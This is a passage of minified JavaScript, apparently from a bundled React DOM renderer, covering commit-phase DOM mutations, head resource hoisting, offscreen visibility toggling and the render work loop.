                i.shared.hiddenCallbacks = a === null ? c : a.concat(c))));
                break;
            case 26:
                var f = Kn;
                if (bn(r, i),
                An(i),
                c & 512 && (Et || a === null || oi(a, a.return)),
                c & 4) {
                    var g = a !== null ? a.memoizedState : null;
                    if (c = i.memoizedState,
                    a === null)
                        if (c === null)
                            if (i.stateNode === null) {
                                e: {
                                    c = i.type,
                                    a = i.memoizedProps,
                                    f = f.ownerDocument || f;
                                    t: switch (c) {
                                    case "title":
                                        g = f.getElementsByTagName("title")[0],
                                        (!g || g[vo] || g[qt] || g.namespaceURI === "http://www.w3.org/2000/svg" || g.hasAttribute("itemprop")) && (g = f.createElement(c),
                                        f.head.insertBefore(g, f.querySelector("head > title"))),
                                        Gt(g, c, a),
                                        g[qt] = i,
                                        Ot(g),
                                        c = g;
                                        break e;
                                    case "link":
                                        var v = xb("link", "href", f).get(c + (a.href || ""));
                                        if (v) {
                                            for (var A = 0; A < v.length; A++)
                                                if (g = v[A],
                                                g.getAttribute("href") === (a.href == null || a.href === "" ? null : a.href) && g.getAttribute("rel") === (a.rel == null ? null : a.rel) && g.getAttribute("title") === (a.title == null ? null : a.title) && g.getAttribute("crossorigin") === (a.crossOrigin == null ? null : a.crossOrigin)) {
                                                    v.splice(A, 1);
                                                    break t
                                                }
                                        }
                                        g = f.createElement(c),
                                        Gt(g, c, a),
                                        f.head.appendChild(g);
                                        break;
                                    case "meta":
                                        if (v = xb("meta", "content", f).get(c + (a.content || ""))) {
                                            for (A = 0; A < v.length; A++)
                                                if (g = v[A],
                                                g.getAttribute("content") === (a.content == null ? null : "" + a.content) && g.getAttribute("name") === (a.name == null ? null : a.name) && g.getAttribute("property") === (a.property == null ? null : a.property) && g.getAttribute("http-equiv") === (a.httpEquiv == null ? null : a.httpEquiv) && g.getAttribute("charset") === (a.charSet == null ? null : a.charSet)) {
                                                    v.splice(A, 1);
                                                    break t
                                                }
                                        }
                                        g = f.createElement(c),
                                        Gt(g, c, a),
                                        f.head.appendChild(g);
                                        break;
                                    default:
                                        throw Error(s(468, c))
                                    }
                                    g[qt] = i,
                                    Ot(g),
                                    c = g
                                }
                                i.stateNode = c
                            } else
                                Sb(f, i.type, i.stateNode);
                        else
                            i.stateNode = Eb(f, c, i.memoizedProps);
                    else
                        g !== c ? (g === null ? a.stateNode !== null && (a = a.stateNode,
                        a.parentNode.removeChild(a)) : g.count--,
                        c === null ? Sb(f, i.type, i.stateNode) : Eb(f, c, i.memoizedProps)) : c === null && i.stateNode !== null && Mh(i, i.memoizedProps, a.memoizedProps)
                }
                break;
            case 27:
                bn(r, i),
                An(i),
                c & 512 && (Et || a === null || oi(a, a.return)),
                a !== null && c & 4 && Mh(i, i.memoizedProps, a.memoizedProps);
                break;
            case 5:
                if (bn(r, i),
                An(i),
                c & 512 && (Et || a === null || oi(a, a.return)),
                i.flags & 32) {
                    f = i.stateNode;
                    try {
                        Ks(f, "")
                    } catch (G) {
                        it(i, i.return, G)
                    }
                }
                c & 4 && i.stateNode != null && (f = i.memoizedProps,
                Mh(i, f, a !== null ? a.memoizedProps : f)),
                c & 1024 && (Uh = !0);
                break;
            case 6:
                if (bn(r, i),
                An(i),
                c & 4) {
                    if (i.stateNode === null)
                        throw Error(s(162));
                    c = i.memoizedProps,
                    a = i.stateNode;
                    try {
                        a.nodeValue = c
                    } catch (G) {
                        it(i, i.return, G)
                    }
                }
                break;
            case 3:
                if (mu = null,
                f = Kn,
                Kn = fu(r.containerInfo),
                bn(r, i),
                Kn = f,
                An(i),
                c & 4 && a !== null && a.memoizedState.isDehydrated)
                    try {
                        dl(r.containerInfo)
                    } catch (G) {
                        it(i, i.return, G)
                    }
                Uh && (Uh = !1,
                kv(i));
                break;
            case 4:
                c = Kn,
                Kn = fu(i.stateNode.containerInfo),
                bn(r, i),
                An(i),
                Kn = c;
                break;
            case 12:
                bn(r, i),
                An(i);
                break;
            case 13:
                bn(r, i),
                An(i),
                i.child.flags & 8192 && i.memoizedState !== null != (a !== null && a.memoizedState !== null) && (Fh = gn()),
                c & 4 && (c = i.updateQueue,
                c !== null && (i.updateQueue = null,
                jh(i, c)));
                break;
            case 22:
                f = i.memoizedState !== null;
                var C = a !== null && a.memoizedState !== null
                  , j = Ui
                  , V = Et;
                if (Ui = j || f,
                Et = V || C,
                bn(r, i),
                Et = V,
                Ui = j,
                An(i),
                c & 8192)
                    e: for (r = i.stateNode,
                    r._visibility = f ? r._visibility & -2 : r._visibility | 1,
                    f && (a === null || C || Ui || Et || ls(i)),
                    a = null,
                    r = i; ; ) {
                        if (r.tag === 5 || r.tag === 26) {
                            if (a === null) {
                                C = a = r;
                                try {
                                    if (g = C.stateNode,
                                    f)
                                        v = g.style,
                                        typeof v.setProperty == "function" ? v.setProperty("display", "none", "important") : v.display = "none";
                                    else {
                                        A = C.stateNode;
                                        var $ = C.memoizedProps.style
                                          , H = $ != null && $.hasOwnProperty("display") ? $.display : null;
                                        A.style.display = H == null || typeof H == "boolean" ? "" : ("" + H).trim()
                                    }
                                } catch (G) {
                                    it(C, C.return, G)
                                }
                            }
                        } else if (r.tag === 6) {
                            if (a === null) {
                                C = r;
                                try {
                                    C.stateNode.nodeValue = f ? "" : C.memoizedProps
                                } catch (G) {
                                    it(C, C.return, G)
                                }
                            }
                        } else if ((r.tag !== 22 && r.tag !== 23 || r.memoizedState === null || r === i) && r.child !== null) {
                            r.child.return = r,
                            r = r.child;
                            continue
                        }
                        if (r === i)
                            break e;
                        for (; r.sibling === null; ) {
                            if (r.return === null || r.return === i)
                                break e;
                            a === r && (a = null),
                            r = r.return
                        }
                        a === r && (a = null),
                        r.sibling.return = r.return,
                        r = r.sibling
                    }
                c & 4 && (c = i.updateQueue,
                c !== null && (a = c.retryQueue,
                a !== null && (c.retryQueue = null,
                jh(i, a))));
                break;
            case 19:
                bn(r, i),
                An(i),
                c & 4 && (c = i.updateQueue,
                c !== null && (i.updateQueue = null,
                jh(i, c)));
                break;
            case 30:
                break;
            case 21:
                break;
            default:
                bn(r, i),
                An(i)
            }
        }
        function An(i) {
            var r = i.flags;
            if (r & 2) {
                try {
                    for (var a, c = i.return; c !== null; ) {
                        if (Ev(c)) {
                            a = c;
                            break
                        }
                        c = c.return
                    }
                    if (a == null)
                        throw Error(s(160));
                    switch (a.tag) {
                    case 27:
                        var f = a.stateNode
                          , g = Dh(i);
                        Wc(i, g, f);
                        break;
                    case 5:
                        var v = a.stateNode;
                        a.flags & 32 && (Ks(v, ""),
                        a.flags &= -33);
                        var A = Dh(i);
                        Wc(i, A, v);
                        break;
                    case 3:
                    case 4:
                        var C = a.stateNode.containerInfo
                          , j = Dh(i);
                        Lh(i, j, C);
                        break;
                    default:
                        throw Error(s(161))
                    }
                } catch (V) {
                    it(i, i.return, V)
                }
                i.flags &= -3
            }
            r & 4096 && (i.flags &= -4097)
        }
        function kv(i) {
            if (i.subtreeFlags & 1024)
                for (i = i.child; i !== null; ) {
                    var r = i;
                    kv(r),
                    r.tag === 5 && r.flags & 1024 && r.stateNode.reset(),
                    i = i.sibling
                }
        }
        function Ar(i, r) {
            if (r.subtreeFlags & 8772)
                for (r = r.child; r !== null; )
                    Tv(i, r.alternate, r),
                    r = r.sibling
        }
        function ls(i) {
            for (i = i.child; i !== null; ) {
                var r = i;
                switch (r.tag) {
                case 0:
                case 11:
                case 14:
                case 15:
                    br(4, r, r.return),
                    ls(r);
                    break;
                case 1:
                    oi(r, r.return);
                    var a = r.stateNode;
                    typeof a.componentWillUnmount == "function" && wv(r, r.return, a),
                    ls(r);
                    break;
                case 27:
                    il(r.stateNode);
                case 26:
                case 5:
                    oi(r, r.return),
                    ls(r);
                    break;
                case 22:
                    r.memoizedState === null && ls(r);
                    break;
                case 30:
                    ls(r);
                    break;
                default:
                    ls(r)
                }
                i = i.sibling
            }
        }
        function wr(i, r, a) {
            for (a = a && (r.subtreeFlags & 8772) !== 0,
            r = r.child; r !== null; ) {
                var c = r.alternate
                  , f = i
                  , g = r
                  , v = g.flags;
                switch (g.tag) {
                case 0:
                case 11:
                case 15:
                    wr(f, g, a),
                    Yo(4, g);
                    break;
                case 1:
                    if (wr(f, g, a),
                    c = g,
                    f = c.stateNode,
                    typeof f.componentDidMount == "function")
                        try {
                            f.componentDidMount()
                        } catch (j) {
                            it(c, c.return, j)
                        }
                    if (c = g,
                    f = c.updateQueue,
                    f !== null) {
                        var A = c.stateNode;
                        try {
                            var C = f.shared.hiddenCallbacks;
                            if (C !== null)
                                for (f.shared.hiddenCallbacks = null,
                                f = 0; f < C.length; f++)
                                    ay(C[f], A)
                        } catch (j) {
                            it(c, c.return, j)
                        }
                    }
                    a && v & 64 && Av(g),
                    Zo(g, g.return);
                    break;
                case 27:
                    xv(g);
                case 26:
                case 5:
                    wr(f, g, a),
                    a && c === null && v & 4 && _v(g),
                    Zo(g, g.return);
                    break;
                case 12:
                    wr(f, g, a);
                    break;
                case 13:
                    wr(f, g, a),
                    a && v & 4 && Cv(f, g);
                    break;
                case 22:
                    g.memoizedState === null && wr(f, g, a),
                    Zo(g, g.return);
                    break;
                case 30:
                    break;
                default:
                    wr(f, g, a)
                }
                r = r.sibling
            }
        }
        function Ph(i, r) {
            var a = null;
            i !== null && i.memoizedState !== null && i.memoizedState.cachePool !== null && (a = i.memoizedState.cachePool.pool),
            i = null,
            r.memoizedState !== null && r.memoizedState.cachePool !== null && (i = r.memoizedState.cachePool.pool),
            i !== a && (i != null && i.refCount++,
            a != null && No(a))
        }
        function Hh(i, r) {
            i = null,
            r.alternate !== null && (i = r.alternate.memoizedState.cache),
            r = r.memoizedState.cache,
            r !== i && (r.refCount++,
            i != null && No(i))
        }
        function li(i, r, a, c) {
            if (r.subtreeFlags & 10256)
                for (r = r.child; r !== null; )
                    Ov(i, r, a, c),
                    r = r.sibling
        }
        function Ov(i, r, a, c) {
            var f = r.flags;
            switch (r.tag) {
            case 0:
            case 11:
            case 15:
                li(i, r, a, c),
                f & 2048 && Yo(9, r);
                break;
            case 1:
                li(i, r, a, c);
                break;
            case 3:
                li(i, r, a, c),
                f & 2048 && (i = null,
                r.alternate !== null && (i = r.alternate.memoizedState.cache),
                r = r.memoizedState.cache,
                r !== i && (r.refCount++,
                i != null && No(i)));
                break;
            case 12:
                if (f & 2048) {
                    li(i, r, a, c),
                    i = r.stateNode;
                    try {
                        var g = r.memoizedProps
                          , v = g.id
                          , A = g.onPostCommit;
                        typeof A == "function" && A(v, r.alternate === null ? "mount" : "update", i.passiveEffectDuration, -0)
                    } catch (C) {
                        it(r, r.return, C)
                    }
                } else
                    li(i, r, a, c);
                break;
            case 13:
                li(i, r, a, c);
                break;
            case 23:
                break;
            case 22:
                g = r.stateNode,
                v = r.alternate,
                r.memoizedState !== null ? g._visibility & 2 ? li(i, r, a, c) : Ko(i, r) : g._visibility & 2 ? li(i, r, a, c) : (g._visibility |= 2,
                ma(i, r, a, c, (r.subtreeFlags & 10256) !== 0)),
                f & 2048 && Ph(v, r);
                break;
            case 24:
                li(i, r, a, c),
                f & 2048 && Hh(r.alternate, r);
                break;
            default:
                li(i, r, a, c)
            }
        }
        function ma(i, r, a, c, f) {
            for (f = f && (r.subtreeFlags & 10256) !== 0,
            r = r.child; r !== null; ) {
                var g = i
                  , v = r
                  , A = a
                  , C = c
                  , j = v.flags;
                switch (v.tag) {
                case 0:
                case 11:
                case 15:
                    ma(g, v, A, C, f),
                    Yo(8, v);
                    break;
                case 23:
                    break;
                case 22:
                    var V = v.stateNode;
                    v.memoizedState !== null ? V._visibility & 2 ? ma(g, v, A, C, f) : Ko(g, v) : (V._visibility |= 2,
                    ma(g, v, A, C, f)),
                    f && j & 2048 && Ph(v.alternate, v);
                    break;
                case 24:
                    ma(g, v, A, C, f),
                    f && j & 2048 && Hh(v.alternate, v);
                    break;
                default:
                    ma(g, v, A, C, f)
                }
                r = r.sibling
            }
        }
        function Ko(i, r) {
            if (r.subtreeFlags & 10256)
                for (r = r.child; r !== null; ) {
                    var a = i
                      , c = r
                      , f = c.flags;
                    switch (c.tag) {
                    case 22:
                        Ko(a, c),
                        f & 2048 && Ph(c.alternate, c);
                        break;
                    case 24:
                        Ko(a, c),
                        f & 2048 && Hh(c.alternate, c);
                        break;
                    default:
                        Ko(a, c)
                    }
                    r = r.sibling
                }
        }
        var Xo = 8192;
        function pa(i) {
            if (i.subtreeFlags & Xo)
                for (i = i.child; i !== null; )
                    Nv(i),
                    i = i.sibling
        }
        function Nv(i) {
            switch (i.tag) {
            case 26:
                pa(i),
                i.flags & Xo && i.memoizedState !== null && BS(Kn, i.memoizedState, i.memoizedProps);
                break;
            case 5:
                pa(i);
                break;
            case 3:
            case 4:
                var r = Kn;
                Kn = fu(i.stateNode.containerInfo),
                pa(i),
                Kn = r;
                break;
            case 22:
                i.memoizedState === null && (r = i.alternate,
                r !== null && r.memoizedState !== null ? (r = Xo,
                Xo = 16777216,
                pa(i),
                Xo = r) : pa(i));
                break;
            default:
                pa(i)
            }
        }
        function Mv(i) {
            var r = i.alternate;
            if (r !== null && (i = r.child,
            i !== null)) {
                r.child = null;
                do
                    r = i.sibling,
                    i.sibling = null,
                    i = r;
                while (i !== null)
            }
        }
        function Jo(i) {
            var r = i.deletions;
            if ((i.flags & 16) !== 0) {
                if (r !== null)
                    for (var a = 0; a < r.length; a++) {
                        var c = r[a];
                        Mt = c,
                        Lv(c, i)
                    }
                Mv(i)
            }
            if (i.subtreeFlags & 10256)
                for (i = i.child; i !== null; )
                    Dv(i),
                    i = i.sibling
        }
        function Dv(i) {
            switch (i.tag) {
            case 0:
            case 11:
            case 15:
                Jo(i),
                i.flags & 2048 && br(9, i, i.return);
                break;
            case 3:
                Jo(i);
                break;
            case 12:
                Jo(i);
                break;
            case 22:
                var r = i.stateNode;
                i.memoizedState !== null && r._visibility & 2 && (i.return === null || i.return.tag !== 13) ? (r._visibility &= -3,
                eu(i)) : Jo(i);
                break;
            default:
                Jo(i)
            }
        }
        function eu(i) {
            var r = i.deletions;
            if ((i.flags & 16) !== 0) {
                if (r !== null)
                    for (var a = 0; a < r.length; a++) {
                        var c = r[a];
                        Mt = c,
                        Lv(c, i)
                    }
                Mv(i)
            }
            for (i = i.child; i !== null; ) {
                switch (r = i,
                r.tag) {
                case 0:
                case 11:
                case 15:
                    br(8, r, r.return),
                    eu(r);
                    break;
                case 22:
                    a = r.stateNode,
                    a._visibility & 2 && (a._visibility &= -3,
                    eu(r));
                    break;
                default:
                    eu(r)
                }
                i = i.sibling
            }
        }
        function Lv(i, r) {
            for (; Mt !== null; ) {
                var a = Mt;
                switch (a.tag) {
                case 0:
                case 11:
                case 15:
                    br(8, a, r);
                    break;
                case 23:
                case 22:
                    if (a.memoizedState !== null && a.memoizedState.cachePool !== null) {
                        var c = a.memoizedState.cachePool.pool;
                        c != null && c.refCount++
                    }
                    break;
                case 24:
                    No(a.memoizedState.cache)
                }
                if (c = a.child,
                c !== null)
                    c.return = a,
                    Mt = c;
                else
                    e: for (a = i; Mt !== null; ) {
                        c = Mt;
                        var f = c.sibling
                          , g = c.return;
                        if (Rv(c),
                        c === a) {
                            Mt = null;
                            break e
                        }
                        if (f !== null) {
                            f.return = g,
                            Mt = f;
                            break e
                        }
                        Mt = g
                    }
            }
        }
        var Fx = {
            getCacheForType: function(i) {
                var r = Ft(Bt)
                  , a = r.data.get(i);
                return a === void 0 && (a = i(),
                r.data.set(i, a)),
                a
            }
        }
          , Qx = typeof WeakMap == "function" ? WeakMap : Map
          , $e = 0
          , at = null
          , Pe = null
          , qe = 0
          , We = 0
          , wn = null
          , _r = !1
          , ga = !1
          , zh = !1
          , Pi = 0
          , At = 0
          , Er = 0
          , cs = 0
          , Gh = 0
          , jn = 0
          , ya = 0
          , $o = null
          , cn = null
          , qh = !1
          , Fh = 0
          , tu = 1 / 0
          , nu = null
          , xr = null
          , zt = 0
          , Sr = null
          , va = null
          , ba = 0
          , Qh = 0
          , Vh = null
          , Uv = null
          , Wo = 0
          , Yh = null;
        function _n() {
            if (($e & 2) !== 0 && qe !== 0)
                return qe & -qe;
            if (T.T !== null) {
                var i = aa;
                return i !== 0 ? i : em()
            }
            return W0()
        }
        function jv() {
            jn === 0 && (jn = (qe & 536870912) === 0 || Ze ? K0() : 536870912);
            var i = Un.current;
            return i !== null && (i.flags |= 32),
            jn
        }
        function En(i, r, a) {
            (i === at && (We === 2 || We === 9) || i.cancelPendingCommit !== null) && (Aa(i, 0),
            Tr(i, qe, jn, !1)),
            yo(i, a),
            (($e & 2) === 0 || i !== at) && (i === at && (($e & 2) === 0 && (cs |= a),
            At === 4 && Tr(i, qe, jn, !1)),
            ci(i))
        }
        function Pv(i, r, a) {
            if (($e & 6) !== 0)
                throw Error(s(327));
            var c = !a && (r & 124) === 0 && (r & i.expiredLanes) === 0 || Yn(i, r)
              , f = c ? Zx(i, r) : Xh(i, r, !0)
              , g = c;
            do {
                if (f === 0) {
                    ga && !c && Tr(i, r, 0, !1);
                    break
                } else {
                    if (a = i.current.alternate,
                    g && !Vx(a)) {
                        f = Xh(i, r, !1),
                        g = !1;
                        continue
                    }
                    if (f === 2) {
                        if (g = r,
                        i.errorRecoveryDisabledLanes & g)
                            var v = 0;
                        else
                            v = i.pendingLanes & -536870913,
                            v = v !== 0 ? v : v & 536870912 ? 536870912 : 0;
                        if (v !== 0) {
                            r = v;
                            e: {
                                var A = i;
                                f = $o;
                                var C = A.current.memoizedState.isDehydrated;
                                if (C && (Aa(A, v).flags |= 256),
                                v = Xh(A, v, !1),
                                v !== 2) {
                                    if (zh && !C) {
                                        A.errorRecoveryDisabledLanes |= g,
                                        cs |= g,
                                        f = 4;
                                        break e
                                    }
                                    g = cn,
                                    cn = f,
                                    g !== null && (cn === null ? cn = g : cn.push.apply(cn, g))
                                }
                                f = v
                            }
                            if (g = !1,
                            f !== 2)
                                continue
                        }
                    }
                    if (f === 1) {
                        Aa(i, 0),
                        Tr(i, r, 0, !0);
                        break
                    }
                    e: {
                        switch (c = i,
                        g = f,
                        g) {
                        case 0:
                        case 1:
                            throw Error(s(345));
                        case 4:
                            if ((r & 4194048) !== r)
                                break;
                        case 6:
                            Tr(c, r, jn, !_r);
                            break e;
                        case 2:
                            cn = null;
                            break;
                        case 3:
                        case 5:
                            break;
                        default:
                            throw Error(s(329))
                        }
                        if ((r & 62914560) === r && (f = Fh + 300 - gn(),
                        10 < f)) {
                            if (Tr(c, r, jn, !_r),
                            ri(c, 0, !0) !== 0)
                                break e;
                            c.timeoutHandle = mb(Hv.bind(null, c, a, cn, nu, qh, r, jn, cs, ya, _r, g, 2, -0, 0), f);
                            break e
                        }
                        Hv(c, a, cn, nu, qh, r, jn, cs, ya, _r, g, 0, -0, 0)
                    }
                }
                break
            } while (!0);
            ci(i)
        }
        function Hv(i, r, a, c, f, g, v, A, C, j, V, $, H, G) {
            if (i.timeoutHandle = -1,
            $ = r.subtreeFlags,
            ($ & 8192 || ($ & 16785408) === 16785408) && (al = {
                stylesheets: null,
                count: 0,
                unsuspend: RS
            },
            Nv(r),
            $ = CS(),
            $ !== null)) {
                i.cancelPendingCommit = $(Yv.bind(null, i, r, g, a, c, f, v, A, C, V, 1, H, G)),
                Tr(i, g, v, !j);
                return
            }
            Yv(i, r, g, a, c, f, v, A, C)
        }
        function Vx(i) {
            for (var r = i; ; ) {
                var a = r.tag;
                if ((a === 0 || a === 11 || a === 15) && r.flags & 16384 && (a = r.updateQueue,
                a !== null && (a = a.stores,
                a !== null)))
                    for (var c = 0; c < a.length; c++) {
                        var f = a[c]
                          , g = f.getSnapshot;
                        f = f.value;
                        try {
                            if (!yn(g(), f))
                                return !1
                        } catch {
                            return !1
                        }
                    }
                if (a = r.child,
                r.subtreeFlags & 16384 && a !== null)
                    a.return = r,
                    r = a;
                else {
                    if (r === i)
                        break;
                    for (; r.sibling === null; ) {
                        if (r.return === null || r.return === i)
                            return !0;
                        r = r.return
                    }
                    r.sibling.return = r.return,
                    r = r.sibling
                }
            }
            return !0
        }
        function Tr(i, r, a, c) {
            r &= ~Gh,
            r &= ~cs,
            i.suspendedLanes |= r,
            i.pingedLanes &= ~r,
            c && (i.warmLanes |= r),
            c = i.expirationTimes;
            for (var f = r; 0 < f; ) {
                var g = 31 - dt(f)
                  , v = 1 << g;
                c[g] = -1,
                f &= ~v
            }
            a !== 0 && J0(i, a, r)
        }
        function iu() {
            return ($e & 6) === 0 ? (el(0),
            !1) : !0
        }
        function Zh() {
            if (Pe !== null) {
                if (We === 0)
                    var i = Pe.return;
                else
                    i = Pe,
                    ki = is = null,
                    dh(i),
                    fa = null,
                    Fo = 0,
                    i = Pe;
                for (; i !== null; )
                    bv(i.alternate, i),
                    i = i.return;
                Pe = null
            }
        }
        function Aa(i, r) {
            var a = i.timeoutHandle;
            a !== -1 && (i.timeoutHandle = -1,
            uS(a)),
            a = i.cancelPendingCommit,
            a !== null && (i.cancelPendingCommit = null,
            a()),
            Zh(),
            at = i,
            Pe = a = Bi(i.current, null),
            qe = r,
            We = 0,
            wn = null,
            _r = !1,
            ga = Yn(i, r),
            zh = !1,
            ya = jn = Gh = cs = Er = At = 0,
            cn = $o = null,
            qh = !1,
            (r & 8) !== 0 && (r |= r & 32);
            var c = i.entangledLanes;
            if (c !== 0)
                for (i = i.entanglements,
                c &= r; 0 < c; ) {
                    var f = 31 - dt(c)
                      , g = 1 << f;
                    r |= i[f],
                    c &= ~g
                }
            return Pi = r,
            Sc(),
            a
        }
        function zv(i, r) {
            De = null,
            T.H = Fc,
            r === Do || r === Mc ? (r = ry(),
            We = 3) : r === ty ? (r = ry(),
            We = 4) : We = r === sv ? 8 : r !== null && typeof r == "object" && typeof r.then == "function" ? 6 : 1,
            wn = r,
            Pe === null && (At = 1,
            Kc(i, Nn(r, i.current)))
        }
        function Gv() {
            var i = T.H;
            return T.H = Fc,
            i === null ? Fc : i
        }
        function qv() {
            var i = T.A;
            return T.A = Fx,
            i
        }
        function Kh() {
            At = 4,
            _r || (qe & 4194048) !== qe && Un.current !== null || (ga = !0),
            (Er & 134217727) === 0 && (cs & 134217727) === 0 || at === null || Tr(at, qe, jn, !1)
        }
        function Xh(i, r, a) {
            var c = $e;
            $e |= 2;
            var f = Gv()
              , g = qv();
            (at !== i || qe !== r) && (nu = null,
            Aa(i, r)),
            r = !1;
            var v = At;
            e: do
                try {
                    if (We !== 0 && Pe !== null) {
                        var A = Pe
                          , C = wn;
                        switch (We) {
                        case 8:
                            Zh(),
                            v = 6;
                            break e;
                        case 3:
                        case 2:
                        case 9:
                        case 6:
                            Un.current === null && (r = !0);
                            var j = We;
                            if (We = 0,
                            wn = null,
                            wa(i, A, C, j),
                            a && ga) {
                                v = 0;
                                break e
                            }
                            break;
                        default:
                            j = We,
                            We = 0,
                            wn = null,
                            wa(i, A, C, j)
                        }
                    }
                    Yx(),
                    v = At;
                    break
                } catch (V) {
                    zv(i, V)
                }
            while (!0);
            return r && i.shellSuspendCounter++,
            ki = is = null,
            $e = c,
            T.H = f,
            T.A = g,
            Pe === null && (at = null,
            qe = 0,
            Sc()),
            v
        }
        function Yx() {
            for (; Pe !== null; )
                Fv(Pe)
        }
        function Zx(i, r) {
            var a = $e;
            $e |= 2;
            var c = Gv()
              , f = qv();
            at !== i || qe !== r ? (nu = null,
            tu = gn() + 500,
            Aa(i, r)) : ga = Yn(i, r);
            e: do
                try {
                    if (We !== 0 && Pe !== null) {
                        r = Pe;
                        var g = wn;
                        t: switch (We) {
                        case 1:
                            We = 0,
                            wn = null,
                            wa(i, r, g, 1);
                            break;
                        case 2:
                        case 9:
                            if (ny(g)) {
                                We = 0,
                                wn = null,
                                Qv(r);
                                break
                            }
                            r = function() {
                                We !== 2 && We !== 9 || at !== i || (We = 7),
                                ci(i)
                            }
                            ,
                            g.then(r, r);
                            break e;
                        case 3:
                            We = 7;
                            break e;
                        case 4:
                            We = 5;
                            break e;
                        case 7:
                            ny(g) ? (We = 0,
                            wn = null,
                            Qv(r)) : (We = 0,
                            wn = null,
                            wa(i, r, g, 7));
                            break;
                        case 5:
                            var v = null;
                            switch (Pe.tag) {
                            case 26:
                                v = Pe.memoizedState;
                            case 5:
                            case 27:
                                var A = Pe;
                                if (!v || Tb(v)) {
                                    We = 0,
                                    wn = null;
                                    var C = A.sibling;
                                    if (C !== null)
                                        Pe = C;
                                    else {
                                        var j = A.return;
                                        j !== null ? (Pe = j,
                                        ru(j)) : Pe = null
                                    }
                                    break t
                                }
                            }
                            We = 0,
                            wn = null,
                            wa(i, r, g, 5);
                            break;
                        case 6:
                            We = 0,
                            wn = null,
                            wa(i, r, g, 6);
                            break;
                        case 8:
                            Zh(),
                            At = 6;
                            break e;
                        default:
                            throw Error(s(462))
                        }
                    }
                    Kx();
                    break
                } catch (V) {
                    zv(i, V)
                }
            while (!0);
            return ki = is = null,
            T.H = c,
            T.A = f,
            $e = a,
            Pe !== null ? 0 : (at = null,
            qe = 0,
            Sc(),
            At)
        }
        function Kx() {
            for (; Pe !== null && !cr(); )
                Fv(Pe)
        }
        function Fv(i) {
            var r = yv(i.alternate, i, Pi);
            i.memoizedProps = i.pendingProps,
            r === null ? ru(i) : Pe = r
        }
        function Qv(i) {
            var r = i
              , a = r.alternate;
            switch (r.tag) {
            case 15:
            case 0:
                r = dv(a, r, r.pendingProps, r.type, void 0, qe);
                break;
            case 11:
                r = dv(a, r, r.pendingProps, r.type.render, r.ref, qe);
                break;
            case 5:
                dh(r);
            default:
                bv(a, r),
                r = Pe = Vg(r, Pi),
                r = yv(a, r, Pi)
            }
            i.memoizedProps = i.pendingProps,
            r === null ? ru(i) : Pe = r
        }
        function wa(i, r, a, c) {
            ki = is = null,
            dh(r),
            fa = null,
            Fo = 0;
            var f = r.return;
            try {
                if (jx(i, f, r, a, qe)) {
                    At = 1,
                    Kc(i, Nn(a, i.current)),
                    Pe = null;
                    return
                }
            } catch (g) {
                if (f !== null)
                    throw Pe = f,
                    g;
                At = 1,
                Kc(i, Nn(a, i.current)),
                Pe = null;
                return
            }
            r.flags & 32768 ? (Ze || c === 1 ? i = !0 : ga || (qe & 536870912) !== 0 ? i = !1 : (_r = i = !0,
            (c === 2 || c === 9 || c === 3 || c === 6) && (c = Un.current,
            c !== null && c.tag === 13 && (c.flags |= 16384))),
            Vv(r, i)) : ru(r)
        }
        function ru(i) {
            var r = i;
            do {
                if ((r.flags & 32768) !== 0) {
                    Vv(r, _r);
                    return
                }
                i = r.return;
                var a = Hx(r.alternate, r, Pi);
                if (a !== null) {
                    Pe = a;
                    return
                }
                if (r = r.sibling,
                r !== null) {
                    Pe = r;
                    return
                }
                Pe = r = i
            } while (r !== null);
            At === 0 && (At = 5)
        }
        function Vv(i, r) {
            do {
                var a = zx(i.alternate, i);
                if (a !== null) {
                    a.flags &= 32767,
                    Pe = a;
                    return
                }
                if (a = i.return,
                a !== null && (a.flags |= 32768,
                a.subtreeFlags = 0,
                a.deletions = null),
                !r && (i = i.sibling,
                i !== null)) {
                    Pe = i;
                    return
                }
                Pe = i = a
            } while (i !== null);
            At = 6,
            Pe = null
        }
        function Yv(i, r, a, c, f, g, v, A, C) {
            i.cancelPendingCommit = null;
            do
                su();
            while (zt !== 0);
            if (($e & 6) !== 0)
                throw Error(s(327));
            if (r !== null) {
                if (r === i.current)
                    throw Error(s(177));
                if (g = r.lanes | r.childLanes,
                g |= Hf,
                RE(i, a, g, v, A, C),
                i === at && (Pe = at = null,
                qe = 0),
                va = r,
                Sr = i,
                ba = a,
                Qh = g,
                Vh = f,
                Uv = c,
                (r.subtreeFlags & 10256) !== 0 || (r.flags & 10256) !== 0 ? (i.callbackNode = null,
                i.callbackPriority = 0,
                Wx(Ps, function() {
                    return $v(),
                    null
                })) : (i.callbackNode = null,
                i.callbackPriority = 0),
                c = (r.flags & 13878) !== 0,
                (r.subtreeFlags & 13878) !== 0 || c) {
                    c = T.T,
                    T.T = null,
                    f = P.p,
                    P.p = 2,
                    v = $e,
                    $e |= 4;
                    try {
                        Gx(i, r, a)
                    } finally {
                        $e = v,
                        P.p = f,
                        T.T = c
                    }
                }
                zt = 1,
                Zv(),
                Kv(),
                Xv()
            }
        }
        function Zv() {
            if (zt === 1) {
                zt = 0;
                var i = Sr
                  , r = va
                  , a = (r.flags & 13878) !== 0;
                if ((r.subtreeFlags & 13878) !== 0 || a) {
                    a = T.T,
                    T.T = null;
                    var c = P.p;
                    P.p = 2;
                    var f = $e;
                    $e |= 4;
                    try {
                        Iv(r, i);
                        var g = lm
                          , v = Lg(i.containerInfo)
                          , A = g.focusedElem
                          , C = g.selectionRange;
                        if (v !== A && A && A.ownerDocument && Dg(A.ownerDocument.documentElement, A)) {
                            if (C !== null && Df(A)) {
                                var j = C.start
                                  , V = C.end;
                                if (V === void 0 && (V = j),
                                "selectionStart"in A)
                                    A.selectionStart = j,
                                    A.selectionEnd = Math.min(V, A.value.length);
                                else {
                                    var $ = A.ownerDocument || document
                                      , H = $ && $.defaultView || window;
                                    if (H.getSelection) {
                                        var G = H.getSelection()
                                          , Te = A.textContent.length
                                          , we = Math.min(C.start, Te)
                                          , nt = C.end === void 0 ? we : Math.min(C.end, Te);
                                        !G.extend && we > nt && (v = nt,
                                        nt = we,
                                        we = v);
                                        var M = Mg(A, we)
                                          , N = Mg(A, nt);
                                        if (M && N && (G.rangeCount !== 1 || G.anchorNode !== M.node || G.anchorOffset !== M.offset || G.focusNode !== N.node || G.focusOffset !== N.offset)) {
                                            var U = $.createRange();
                                            U.setStart(M.node, M.offset),
                                            G.removeAllRanges(),
                                            we > nt ? (G.addRange(U),
                                            G.extend(N.node, N.offset)) : (U.setEnd(N.node, N.offset),
                                            G.addRange(U))
                                        }
                                    }
                                }
                            }
                            for ($ = [],
                            G = A; G = G.parentNode; )
